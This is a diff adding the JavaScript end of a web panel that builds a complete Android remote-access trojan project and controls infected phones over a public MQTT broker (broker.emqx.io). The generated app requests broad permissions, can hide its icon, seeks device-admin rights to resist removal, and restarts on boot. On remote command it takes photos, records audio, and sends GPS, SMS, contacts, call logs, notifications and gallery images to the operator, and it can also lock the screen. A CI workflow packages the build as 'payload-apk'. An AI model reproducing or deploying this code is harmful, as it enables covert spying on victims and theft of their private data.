+  cv.setUint32(0,0x02014b50,true);cv.setUint16(4,20,true);cv.setUint16(6,20,true);cv.setUint16(12,dt,true);cv.setUint16(14,dd3,true);
+  cv.setUint32(16,crc,true);cv.setUint32(20,data.length,true);cv.setUint32(24,data.length,true);cv.setUint16(28,nm.length,true);cv.setUint32(42,off,true);
+  ch.set(nm,46);cd2.push(ch);off+=lh.length+data.length;});
+ var cdd=new Uint8Array(cd2.reduce(function(a,b){return a+b.length;},0)),o=0;
+ cd2.forEach(function(c){cdd.set(c,o);o+=c.length;});
+ var eo=new Uint8Array(22),ev=new DataView(eo.buffer);
+ ev.setUint32(0,0x06054b50,true);ev.setUint16(8,files.length,true);ev.setUint16(10,files.length,true);ev.setUint32(12,cdd.length,true);ev.setUint32(16,off,true);
+ return new Blob(p.concat([cdd,eo]),{type:'application/zip'});}
+function wavScream(){var sr=22050,n=Math.floor(sr*1.4),buf=new ArrayBuffer(44+n*2),v=new DataView(buf);
+ function w(o,s){for(var i=0;i<s.length;i++)v.setUint8(o+i,s.charCodeAt(i));}
+ w(0,'RIFF');v.setUint32(4,36+n*2,true);w(8,'WAVE');w(12,'fmt ');v.setUint32(16,16,true);v.setUint16(20,1,true);
+ v.setUint16(22,1,true);v.setUint32(24,sr,true);v.setUint32(28,sr*2,true);v.setUint16(32,2,true);v.setUint16(34,16,true);
+ w(36,'data');v.setUint32(40,n*2,true);var ph=0;
+ for(var i=0;i<n;i++){var t=i/sr,env=Math.min(1,t/.07)*Math.exp(-2.1*t);
+  ph+=2*Math.PI*(880*Math.exp(-1.35*t)+60)/sr;var saw=((ph/(2*Math.PI))%1)*2-1;
+  var s=(saw*.55+(Math.random()*2-1)*.7*.45)*env;s=Math.max(-1,Math.min(1,s*1.6));
+  v.setInt16(44+i*2,s*32000,true);}
+ return new Uint8Array(buf);}
+function png(size){return new Promise(function(res){
+ if(!ICON){var c=document.createElement('canvas');c.width=c.height=size;var x=c.getContext('2d');
+  x.fillStyle='#07120e';x.fillRect(0,0,size,size);x.fillStyle='#00ffa3';x.font='bold '+(size*.6)+'px monospace';
+  x.textAlign='center';x.textBaseline='middle';x.fillText('☠',size/2,size*.55);
+  return c.toBlob(function(b){var r=new FileReader();r.onload=function(){res(new Uint8Array(r.result));};r.readAsArrayBuffer(b);},'image/png');}
+ var img=new Image();img.onload=function(){var c=document.createElement('canvas');c.width=c.height=size;
+  c.getContext('2d').drawImage(img,0,0,size,size);
+  c.toBlob(function(b){var r=new FileReader();r.onload=function(){res(new Uint8Array(r.result));};r.readAsArrayBuffer(b);},'image/png');};img.src=ICON;});}
+function enc(s){return new TextEncoder().encode(s);}
+function blog(m,c){var e=document.createElement('span');e.className=c||'';e.textContent=m+'\n';$('#logbuild').appendChild(e);$('#logbuild').scrollTop=1e5;}
+
+function manifest(pkg,admin,boot){var perms=['INTERNET','ACCESS_NETWORK_STATE','ACCESS_FINE_LOCATION','ACCESS_COARSE_LOCATION','ACCESS_BACKGROUND_LOCATION','CAMERA','RECORD_AUDIO','READ_CONTACTS','READ_SMS','RECEIVE_SMS','READ_CALL_LOG','READ_MEDIA_IMAGES','POST_NOTIFICATIONS','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC','WAKE_LOCK','VIBRATE','FLASHLIGHT','SET_WALLPAPER','QUERY_ALL_PACKAGES','RECEIVE_BOOT_COMPLETED','BIND_NOTIFICATION_LISTENER_SERVICE','REQUEST_IGNORE_BATTERY_OPTIMIZATIONS'];
+ return '<?xml version="1.0" encoding="utf-8"?>\n<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="'+pkg+'">\n'+
+ perms.map(function(p){return ' <uses-permission android:name="android.permission.'+p+'"/>';}).join('\n')+
+ '\n <application android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:usesCleartextTraffic="true" android:hardwareAccelerated="true">\n'+
+ '  <activity android:name=".MainActivity" android:exported="true" android:theme="@android:style/Theme.NoTitleBar">\n'+
+ '   <intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter>\n'+
+ '  </activity>\n'+
+ '  <activity android:name=".LockActivity" android:exported="false" android:showWhenLocked="true" android:turnScreenOn="true" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>\n'+
+ '  <service android:name=".Agent" android:exported="false" android:foregroundServiceType="dataSync"/>\n'+
+ (admin?'  <receiver android:name=".AdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN" android:exported="true">\n   <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>\n   <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/></intent-filter>\n  </receiver>\n':'')+
+ (boot?'  <receiver android:name=".BootReceiver" android:exported="true"><intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter></receiver>\n':'')+
+ '  <service android:name=".NotifService" android:exported="true" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">\n'+
+ '   <intent-filter><action android:name="android.service.notification.NotificationListenerService"/></intent-filter>\n  </service>\n'+
+ ' </application>\n</manifest>\n';}
+
+function mainJava(pkg,name,code,room,admin,hide,scream){
+ var J=[];
+ J.push('package '+pkg+';');
+ J.push('import android.Manifest;import android.app.*;import android.app.admin.DevicePolicyManager;');
+ J.push('import android.content.*;import android.content.pm.PackageManager;import android.media.MediaPlayer;import android.os.*;');
+ J.push('import android.text.InputType;import android.view.WindowManager;import android.webkit.*;import android.widget.*;');
+ J.push('import java.util.*;');
+ J.push('public class MainActivity extends Activity{');
+ J.push(' WebView wv;DevicePolicyManager dpm;ComponentName admin;final String CODE="'+code+'";');
+ J.push(' @Override protected void onCreate(Bundle b){super.onCreate(b);');
+ J.push('  getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);');
+ J.push('  dpm=(DevicePolicyManager)getSystemService(DEVICE_POLICY_SERVICE);admin=new ComponentName(this,AdminReceiver.class);');
+ J.push('  if(!getSharedPreferences("p",0).getBoolean("ok",false))gate();else start();}');
+ J.push(' void gate(){final EditText et=new EditText(this);et.setInputType(InputType.TYPE_CLASS_NUMBER);et.setHint("Kode akses");');
+ J.push('  new AlertDialog.Builder(this).setTitle("'+name+'").setMessage("Masukkan kode akses.").setView(et).setCancelable(false)');
+ J.push('   .setPositiveButton("BUKA",(d,w)->{if(et.getText().toString().trim().equals(CODE)){');
+ J.push('    getSharedPreferences("p",0).edit().putBoolean("ok",true).apply();start();}else{wrong();new Handler().postDelayed(this::gate,400);}}).show();}');
+ J.push(' void wrong(){Toast.makeText(this,"KODE SALAH!",Toast.LENGTH_SHORT).show();');
+ J.push('  ((Vibrator)getSystemService(VIBRATOR_SERVICE)).vibrate(new long[]{0,150,80,150,80,400});');
+ if(scream)J.push('  try{MediaPlayer.create(this,R.raw.scream).start();}catch(Exception e){}');
+ J.push(' }');
+ J.push(' void start(){askPerms();');
+ if(admin)J.push('  try{if(!dpm.isAdminActive(admin)){Intent i=new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,admin);i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,"Aktifkan agar tidak mudah dihapus.");startActivity(i);}}catch(Exception e){}');
+ if(hide)J.push('  hideIcon();');
+ J.push('  Intent sv=new Intent(this,Agent.class);sv.putExtra("room","'+room+'");');
+ J.push('  if(Build.VERSION.SDK_INT>=26)startForegroundService(sv);else startService(sv);');
+ J.push('  wv=new WebView(this);setContentView(wv);WebSettings s=wv.getSettings();');
+ J.push('  s.setJavaScriptEnabled(true);s.setDomStorageEnabled(true);s.setAllowFileAccess(true);');
+ J.push('  s.setMediaPlaybackRequiresUserGesture(false);s.setGeolocationEnabled(true);');
+ J.push('  wv.setWebChromeClient(new WebChromeClient(){');
+ J.push('   @Override public void onPermissionRequest(final PermissionRequest r){runOnUiThread(()->r.grant(r.getResources()));}');
+ J.push('   @Override public void onGeolocationPermissionsShowPrompt(String o,GeolocationPermissions.Callback c){c.invoke(o,true,false);}});');
+ J.push('  wv.loadUrl("file:///android_asset/index.html");}');
+ J.push(' void hideIcon(){try{getPackageManager().setComponentEnabledSetting(new ComponentName(this,getPackageName()+".MainActivity"),');
+ J.push('  PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);}catch(Exception e){}}');
+ J.push(' void askPerms(){List<String>p=new ArrayList<>();String[] all={Manifest.permission.CAMERA,Manifest.permission.RECORD_AUDIO,');
+ J.push('  Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_CONTACTS,Manifest.permission.READ_SMS,');
+ J.push('  Manifest.permission.READ_CALL_LOG,Manifest.permission.POST_NOTIFICATIONS};');
+ J.push('  for(String x:all)if(checkSelfPermission(x)!=PackageManager.PERMISSION_GRANTED)p.add(x);');
+ J.push('  if(!p.isEmpty())requestPermissions(p.toArray(new String[0]),1);}');
+ J.push('}');
+ return J.join('\n')+'\n';
+}
+
+function agentJava(pkg,room){
+ var A=[];
+ A.push('package '+pkg+';');
+ A.push('import android.app.*;import android.content.*;import android.database.Cursor;');
+ A.push('import android.graphics.Bitmap;import android.hardware.camera2.CameraManager;import android.location.*;');
+ A.push('import android.media.*;import android.net.Uri;import android.os.*;import android.provider.*;');
+ A.push('import android.util.Base64;import java.io.*;import java.util.*;import java.util.concurrent.Executors;');
+ A.push('import org.eclipse.paho.client.mqttv3.*;import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;');
+ A.push('import androidx.camera.core.*;import androidx.camera.lifecycle.ProcessCameraProvider;');
+ A.push('import androidx.core.content.ContextCompat;import androidx.lifecycle.LifecycleService;');
+ A.push('public class Agent extends LifecycleService{');
+ A.push(' public static String DEV="";MqttClient mc;ExecutorService ex=Executors.newSingleThreadExecutor();');
+ A.push(' String room="";LocationManager lm;CameraManager cm;boolean torch=false;');
+ A.push(' @Override public int onStartCommand(Intent it,int f,int s){super.onStartCommand(it,f,s);');
+ A.push('  room=it!=null&&it.getStringExtra("room")!=null?it.getStringExtra("room"):room;');
+ A.push('  if(DEV.isEmpty())DEV="A"+Build.MODEL.replaceAll("[^A-Za-z0-9]","")+new Random().nextInt(999);');
+ A.push('  NotificationChannel ch=new NotificationChannel("c2","C2",NotificationManager.IMPORTANCE_MIN);');
+ A.push('  ((NotificationManager)getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);');
+ A.push('  startForeground(1,new Notification.Builder(this,"c2").setContentTitle("Layanan sistem")');
+ A.push('   .setSmallIcon(android.R.drawable.stat_sys_download_done).setOngoing(true).build());');
+ A.push('  cm=(CameraManager)getSystemService(CAMERA_SERVICE);lm=(LocationManager)getSystemService(LOCATION_SERVICE);');
+ A.push('  ex.execute(this::connect);return START_STICKY;}');
+ A.push(' void connect(){try{mc=new MqttClient("tcp://broker.emqx.io:1883",DEV+System.currentTimeMillis()%9999,new MemoryPersistence());');
+ A.push('  MqttConnectOptions o=new MqttConnectOptions();o.setAutomaticReconnect(true);o.setCleanSession(true);');
+ A.push('  mc.connect(o);mc.subscribe("mzn/"+room+"/"+DEV+"/down",1,(t,m)->ex.execute(()->cmd(new String(m.getPayload()))));');
+ A.push('  pub("{\\"t\\":\\"hello\\",\\"name\\":\\""+Build.MANUFACTURER+" "+Build.MODEL+"\\",\\"model\\":\\""+Build.MODEL+"\\",\\"os\\":\\""+Build.VERSION.RELEASE+"\\",\\"bat\\":0}");');
+ A.push('  up();}catch(Exception e){}}');
+ A.push(' void pub(String j){try{if(mc!=null&&mc.isConnected())mc.publish("mzn/"+room+"/"+DEV+"/up",new MqttMessage(j.getBytes()));}catch(Exception e){}}');
+ A.push(' void up(){new Handler(Looper.getMainLooper()).postDelayed(()->{bat();ex.execute(this::up);},30000);}');
+ A.push(' void bat(){Intent i=registerReceiver(null,new IntentFilter(Intent.ACTION_BATTERY_CHANGED));');
+ A.push('  int l=i.getIntExtra(BatteryManager.EXTRA_LEVEL,0),sc=i.getIntExtra(BatteryManager.EXTRA_SCALE,100);');
+ A.push('  pub("{\\"t\\":\\"battery\\",\\"level\\":"+(l*100/sc)+"}");}');
+ A.push(' void cmd(String j){try{org.json.JSONObject o=new org.json.JSONObject(j);String c=o.getString("cmd");');
+ A.push('  org.json.JSONObject a=o.optJSONObject("args");');
+ A.push('  if(c.equals("photo"))photo(a!=null&&"front".equals(a.optString("cam")));');
+ A.push('  else if(c.equals("audio"))audio();else if(c.equals("gps"))gps();');
+ A.push('  else if(c.equals("kon"))pub("{\\"t\\":\\"kon\\",\\"items\\":"+Dump.kon(this)+"}");');
+ A.push('  else if(c.equals("sms"))pub("{\\"t\\":\\"sms\\",\\"items\\":"+Dump.sms(this)+"}");');
+ A.push('  else if(c.equals("call"))pub("{\\"t\\":\\"call\\",\\"items\\":"+Dump.call(this)+"}");');
+ A.push('  else if(c.equals("notif"))pub("{\\"t\\":\\"notif\\",\\"items\\":"+NotifService.dump()+"}");');
+ A.push('  else if(c.equals("info"))pub("{\\"t\\":\\"info\\",\\"model\\":\\""+Build.MODEL+"\\",\\"os\\":\\""+Build.VERSION.RELEASE+"\\",\\"bat\\":0}");');
+ A.push('  else if(c.equals("vibrate"))((Vibrator)getSystemService(VIBRATOR_SERVICE)).vibrate(2000);');
+ A.push('  else if(c.equals("torch")){try{String id=cm.getCameraIdList()[0];cm.setTorchMode(id,!torch);torch=!torch;}catch(Exception e){}}');
+ A.push('  else if(c.equals("toast")){String m=a!=null?a.optString("msg"):"";');
+ A.push('   new Handler(Looper.getMainLooper()).post(()->Toast.makeText(this,m,Toast.LENGTH_LONG).show());}');
+ A.push('  else if(c.equals("open")){String u=a!=null?a.optString("url"):"";');
+ A.push('   Intent i2=new Intent(Intent.ACTION_VIEW,Uri.parse(u));i2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);startActivity(i2);}');
+ A.push('  else if(c.equals("lock")){Intent i3=new Intent(this,LockActivity.class);i3.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);startActivity(i3);}');
+ A.push('  else if(c.equals("gallery"))gallery();}catch(Exception e){}}');
+ A.push(' void photo(final boolean front){');
+ A.push('  ProcessCameraProvider.getInstance(this).addListener(()->{try{');
+ A.push('   ProcessCameraProvider p=ProcessCameraProvider.getInstance(this).get();');
+ A.push('   ImageCapture ic=new ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build();');
+ A.push('   p.unbindAll();p.bindToLifecycle(this,front?CameraSelector.DEFAULT_FRONT_CAMERA:CameraSelector.DEFAULT_BACK_CAMERA,ic);');
+ A.push('   final File f=new File(getCacheDir(),"p.jpg");');
+ A.push('   ic.takePicture(new ImageCapture.OutputFileOptions.Builder(f).build(),ContextCompat.getMainExecutor(this),');
+ A.push('    new ImageCapture.OnImageSavedCallback(){');
+ A.push('     public void onImageSaved(ImageCapture.OutputFileResults r){try{');
+ A.push('      byte[] b=new byte[(int)f.length()];FileInputStream in=new FileInputStream(f);in.read(b);in.close();');
+ A.push('      pub("{\\"t\\":\\"photo\\",\\"cam\\":\\""+(front?"front":"back")+"\\",\\"data\\":\\""+Base64.encodeToString(b,Base64.NO_WRAP)+"\\"}");');
+ A.push('     }catch(Exception e){}}');
+ A.push('     public void onError(ImageCaptureException e){}});');
+ A.push('  }catch(Exception e){}},ContextCompat.getMainExecutor(this));}');
+ A.push(' void audio(){try{final File f=new File(getCacheDir(),"a.m4a");');
+ A.push('  final MediaRecorder r=new MediaRecorder();r.setAudioSource(MediaRecorder.AudioSource.MIC);');
+ A.push('  r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);');
+ A.push('  r.setOutputFile(f.getAbsolutePath());r.prepare();r.start();');
+ A.push('  new Handler(Looper.getMainLooper()).postDelayed(()->{try{r.stop();r.release();');
+ A.push('   byte[] b=new byte[(int)f.length()];FileInputStream in=new FileInputStream(f);in.read(b);in.close();');
+ A.push('   pub("{\\"t\\":\\"audio\\",\\"data\\":\\""+Base64.encodeToString(b,Base64.NO_WRAP)+"\\"}");}catch(Exception e){}},8000);');
+ A.push(' }catch(Exception e){}}');
+ A.push(' void gps(){try{Location l=lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);');
+ A.push('  if(l==null)l=lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);');
+ A.push('  if(l!=null)pub("{\\"t\\":\\"gps\\",\\"lat\\":"+l.getLatitude()+",\\"lng\\":"+l.getLongitude()+",\\"acc\\":"+l.getAccuracy()+"}");');
+ A.push('  lm.requestSingleUpdate(LocationManager.GPS_PROVIDER,new LocationListener(){');
+ A.push('   public void onLocationChanged(Location x){pub("{\\"t\\":\\"gps\\",\\"lat\\":"+x.getLatitude()+",\\"lng\\":"+x.getLongitude()+",\\"acc\\":"+x.getAccuracy()+"}");}');
+ A.push('   public void onStatusChanged(String a,int b,Bundle c){}public void onProviderEnabled(String a){}public void onProviderDisabled(String a){}},null);');
+ A.push(' }catch(Exception e){}}');
+ A.push(' void gallery(){try{List<String> im=new ArrayList<>();');
+ A.push('  Cursor c=getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,null,null,null,MediaStore.Images.Media.DATE_ADDED+" DESC");');
+ A.push('  int n=0;while(c!=null&&c.moveToNext()&&n<8){long id=c.getLong(c.getColumnIndex(MediaStore.Images.Media._ID));n++;');
+ A.push('   Bitmap bm=MediaStore.Images.Thumbnails.getThumbnail(getContentResolver(),id,MediaStore.Images.Thumbnails.MINI_KIND,null);');
+ A.push('   if(bm==null)continue;ByteArrayOutputStream bo=new ByteArrayOutputStream();');
+ A.push('   bm.compress(Bitmap.CompressFormat.JPEG,70,bo);');
+ A.push('   im.add("{\\"id\\":\\""+id+"\\",\\"url\\":\\"data:image/jpeg;base64,"+Base64.encodeToString(bo.toByteArray(),Base64.NO_WRAP)+"\\"}");}');
+ A.push('  if(c!=null)c.close();pub("{\\"t\\":\\"gallery\\",\\"items\\":["+String.join(",",im)+"]}");}catch(Exception e){}}');
+ A.push('}');
+ return A.join('\n')+'\n';
+}
+
+function dumpJava(pkg){
+ return 'package '+pkg+';\nimport android.content.Context;import android.database.Cursor;import android.provider.*;\n'+
+ 'public class Dump{\n static String j(String s){return s==null?"":s.replace("\\"","\'");}\n'+
+ ' public static String kon(Context c){StringBuilder b=new StringBuilder("[");boolean f=true;\n'+
+ '  Cursor q=c.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);\n'+
+ '  while(q!=null&&q.moveToNext()){if(!f)b.append(",");f=false;\n'+
+ '   b.append("{\\"name\\":\\"").append(j(q.getString(q.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))).append("\\",\\"tel\\":\\"").append(j(q.getString(q.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))).append("\\"}");}\n'+
+ '  if(q!=null)q.close();return b.append("]").toString();}\n'+
+ ' public static String sms(Context c){StringBuilder b=new StringBuilder("[");boolean f=true;\n'+
+ '  Cursor q=c.getContentResolver().query(android.net.Uri.parse("content://sms/inbox"),null,null,null,"date DESC");\n'+
+ '  int n=0;while(q!=null&&q.moveToNext()&&n<80){if(!f)b.append(",");f=false;n++;\n'+
+ '   b.append("{\\"from\\":\\"").append(j(q.getString(q.getColumnIndex("address")))).append("\\",\\"body\\":\\"").append(j(q.getString(q.getColumnIndex("body")))).append("\\"}");}\n'+
+ '  if(q!=null)q.close();return b.append("]").toString();}\n'+
+ ' public static String call(Context c){StringBuilder b=new StringBuilder("[");boolean f=true;\n'+
+ '  Cursor q=c.getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,"date DESC");\n'+
+ '  int n=0;while(q!=null&&q.moveToNext()&&n<80){if(!f)b.append(",");f=false;n++;\n'+
+ '   b.append("{\\"name\\":\\"").append(j(q.getString(q.getColumnIndex(CallLog.Calls.CACHED_NAME)))).append("\\",\\"tel\\":\\"").append(j(q.getString(q.getColumnIndex(CallLog.Calls.NUMBER)))).append("\\",\\"dur\\":").append(q.getInt(q.getColumnIndex(CallLog.Calls.DURATION))).append(",\\"type\\":\\"").append(q.getInt(q.getColumnIndex(CallLog.Calls.TYPE))).append("\\"}");}\n'+
+ '  if(q!=null)q.close();return b.append("]").toString();}\n}\n';
+}
+function notifJava(pkg){
+ return 'package '+pkg+';\nimport android.service.notification.*;import android.os.Bundle;import java.util.*;\n'+
+ 'public class NotifService extends NotificationListenerService{\n static final List<String> L=new ArrayList<>();\n'+
+ ' @Override public void onNotificationPosted(StatusBarNotification s){try{Bundle b=s.getNotification().extras;\n'+
+ '  L.add(s.getPackageName()+"|"+b.getString(android.app.Notification.EXTRA_TITLE,"")+"|"+b.getString(android.app.Notification.EXTRA_TEXT,""));\n'+
+ '  if(L.size()>150)L.remove(0);}catch(Exception e){}}\n'+
+ ' public static String dump(){StringBuilder b=new StringBuilder("[");\n'+
+ '  for(int i=0;i<L.size();i++){String[]p=L.get(i).split("\\\\|");\n'+
+ '   b.append(i>0?",":"").append("{\\"app\\":\\"").append(p[0]).append("\\",\\"text\\":\\"").append(p.length>2?p[1]+" "+p[2]:"").append("\\"}");}\n'+
+ '  return b.append("]").toString();}\n}\n';
+}
+
+function buildProject(){
+ var name=$('#fName').value.trim()||'Sistem Update',pkg=$('#fPkg').value.trim(),code=$('#fCode').value.trim()||'211421';
+ var room=$('#fRoom').value.trim()||ROOM,html=$('#fHtml').value||'<h1>OK</h1>';
+ var admin=$('#fAdmin').checked,hide=$('#fHide').checked,boot=$('#fBoot').checked,scr=$('#fScream').checked;
+ var path=pkg.replace(/\./g,'/');
+ return png(48).then(function(i48){return png(96).then(function(i96){return png(192).then(function(i192){
+  return [
+   {name:'settings.gradle',data:enc("pluginManagement{repositories{google();mavenCentral();gradlePluginPortal()}}\ndependencyResolutionManagement{repositories{google();mavenCentral()}}\nrootProject.name='"+name+"'\ninclude ':app'\n")},
+   {name:'build.gradle',data:enc("plugins{id 'com.android.application' version '8.5.2' apply false}\n")},
+   {name:'gradle.properties',data:enc("org.gradle.jvmargs=-Xmx2g\nandroid.useAndroidX=true\n")},
+   {name:'app/build.gradle',data:enc("plugins{id 'com.android.application'}\nandroid{namespace '"+pkg+"'\n compileSdk 34\n defaultConfig{applicationId '"+pkg+"'\n minSdk 26\n targetSdk 34\n versionCode 1\n versionName '1.0'}\n buildTypes{release{minifyEnabled false}}\n compileOptions{sourceCompatibility JavaVersion.VERSION_17\ntargetCompatibility JavaVersion.VERSION_17}}\ndependencies{\n implementation 'org.eclipse.paho:org.eclipse.paho.client.mqttv3:1.2.5'\n implementation 'androidx.camera:camera-core:1.3.4'\n implementation 'androidx.camera:camera-camera2:1.3.4'\n implementation 'androidx.camera:camera-lifecycle:1.3.4'\n implementation 'androidx.lifecycle:lifecycle-service:2.7.0'\n}\n")},
+   {name:'app/src/main/AndroidManifest.xml',data:enc(manifest(pkg,admin,boot))},
+   {name:'app/src/main/java/'+path+'/MainActivity.java',data:enc(mainJava(pkg,name,code,room,admin,hide,scr))},
+   {name:'app/src/main/java/'+path+'/Agent.java',data:enc(agentJava(pkg,room))},
+   {name:'app/src/main/java/'+path+'/Dump.java',data:enc(dumpJava(pkg))},
+   {name:'app/src/main/java/'+path+'/NotifService.java',data:enc(notifJava(pkg))},
+   {name:'app/src/main/java/'+path+'/AdminReceiver.java',data:enc("package "+pkg+";\nimport android.app.admin.DeviceAdminReceiver;\npublic class AdminReceiver extends DeviceAdminReceiver{}\n")},
+   {name:'app/src/main/java/'+path+'/BootReceiver.java',data:enc("package "+pkg+";\nimport android.content.*;\npublic class BootReceiver extends BroadcastReceiver{\n @Override public void onReceive(Context c,Intent i){Intent x=new Intent(c,Agent.class);x.putExtra(\"room\",\""+room+"\");if(android.os.Build.VERSION.SDK_INT>=26)c.startForegroundService(x);else c.startService(x);}\n}\n")},
+   {name:'app/src/main/java/'+path+'/LockActivity.java',data:enc("package "+pkg+";\nimport android.app.Activity;import android.os.Bundle;import android.view.WindowManager;import android.webkit.*;\npublic class LockActivity extends Activity{\n @Override protected void onCreate(Bundle b){super.onCreate(b);\n  getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);\n  WebView w=new WebView(this);setContentView(w);w.getSettings().setJavaScriptEnabled(true);w.getSettings().setAllowFileAccess(true);\n  w.addJavascriptInterface(new Object(){@JavascriptInterface public void buka(){runOnUiThread(()->finish());}},\"Lock\");\n  w.loadUrl(\"file:///android_asset/lock.html\");}\n}\n")},
+   {name:'app/src/main/assets/index.html',data:enc(html)},
+   {name:'app/src/main/assets/lock.html',data:enc($('#lockHtml').value||LT)},
+   {name:'app/src/main/res/values/strings.xml',data:enc('<?xml version="1.0" encoding="utf-8"?>\n<resources><string name="app_name">'+name+'</string></resources>\n')},
+   {name:'app/src/main/res/xml/device_admin.xml',data:enc('<?xml version="1.0" encoding="utf-8"?>\n<device-admin xmlns:android="http://schemas.android.com/apk/res/android"><uses-policies><force-lock/><wipe-data/></uses-policies></device-admin>\n')},
+   {name:'app/src/main/res/raw/scream.wav',data:wavScream()},
+   {name:'app/src/main/res/mipmap-mdpi/ic_launcher.png',data:i48},
+   {name:'app/src/main/res/mipmap-hdpi/ic_launcher.png',data:i96},
+   {name:'app/src/main/res/mipmap-xxhdpi/ic_launcher.png',data:i192},
+   {name:'.github/workflows/build.yml',data:enc("name: build\non: [push, workflow_dispatch]\njobs:\n  apk:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-java@v4\n        with:\n          distribution: temurin\n          java-version: '17'\n      - uses: gradle/actions/setup-gradle@v3\n        with:\n          gradle-version: '8.7'\n      - run: gradle assembleDebug --no-daemon\n      - uses: actions/upload-artifact@v4\n        with:\n          name: payload-apk\n          path: app/build/outputs/apk/debug/*.apk\n")},
+   {name:'README.md',data:enc('# '+name+'\n\nRoom: '+room+'\nKode: '+code+'\n\nPush -> Actions -> artifact payload-apk.\n')}
+  ];
+ });});});}
+$('#buildBtn').onclick=function(){
+  if(!$('#fPkg').value.trim()){toast('Package wajib',true);return;}
+  $('#buildSt').textContent='BUILDING';$('#logbuild').innerHTML='';
+  buildProject().then(function(f){var i=0,st=['> gradle init','> manifest','> agent MQTT','> assets','> icon','> scream','> zip'];
+    var iv=setInterval(function(){if(i<st.length){blog(st[i]);i++;}else{clearInterval(iv);
+      var b=makeZip(f);$('#buildSt').textContent='SIAP';blog('✔ '+Math.round(b.size/1024)+' KB','ok');
+      dl('payload_'+stamp()+'.zip',b);toast('⚡ ZIP siap');log('BUILD '+f.length+' file','ok');}},220);});
+};
+$('#dlHtml').onclick=function(){dl('payload_'+stamp()+'.html',$('#fHtml').value||'<h1>OK</h1>','text/html');};
+
+$('#roomNew').onclick=function(){ROOM='R'+Math.random().toString(36).slice(2,9).toUpperCase();$('#roomIn').value=ROOM;$('#fRoom').value=ROOM;DB.set('room',ROOM);};
+$('#roomCopy').onclick=function(){navigator.clipboard.writeText($('#roomIn').value).then(function(){toast('⧉ Room disalin');});};
+$('#roomSave').onclick=function(){ROOM=$('#roomIn').value.trim();DB.set('room',ROOM);$('#fRoom').value=ROOM;
+  if(CL){CL.end(true);}setTimeout(mqttConnect,600);toast('Relay disambung ulang');};
+
+$('#dlAll').onclick=function(){if(needDev())dl('dump_'+stamp()+'.json',JSON.stringify(cur(),null,2));};
+$('#wipeAll').onclick=function(){if(!confirm('Hapus semua device & data?'))return;D=[];CUR='';LOG=[];DB.clear();save();renderDev();paintSel();$('#console').innerHTML='';toast('Dibersihkan');};
+$('#logDl').onclick=function(){dl('log_'+stamp()+'.txt',LOG.map(function(x){return x.t+' '+x.m;}).join('\n'),'text/plain');};
+$('#logClr').onclick=function(){LOG=[];save();$('#console').innerHTML='';};
+
+var START=Date.now();
+function boot(){
+  if(!ROOM){ROOM='R'+Math.random().toString(36).slice(2,9).toUpperCase();DB.set('room',ROOM);}
+  $('#roomIn').value=ROOM;$('#fRoom').value=ROOM;
+  renderDev();paintSel();initBat();initNet();fetchIP();
+  $('#lockPrev').srcdoc=$('#lockHtml').value;
+  mqttConnect();
+  setInterval(function(){var s=Math.floor((Date.now()-START)/1000);
+    $('#stUp').textContent=pad(Math.floor(s/3600))+':'+pad(Math.floor(s%3600/60))+':'+pad(s%60);
+    $('#clock').textContent=new Date().toLocaleTimeString('id-ID');},1000);
+  setInterval(function(){D.forEach(function(d){if(d.local)return;if(Date.now()-d.last>45000)d.online=false;});renderDev();},10000);
+  log('PANEL siap · room '+ROOM,'ok');
+  if(D.length===0)addLocal();
+}
+$('#pw').focus();
+})();
+</script>
+</body>
+</html>
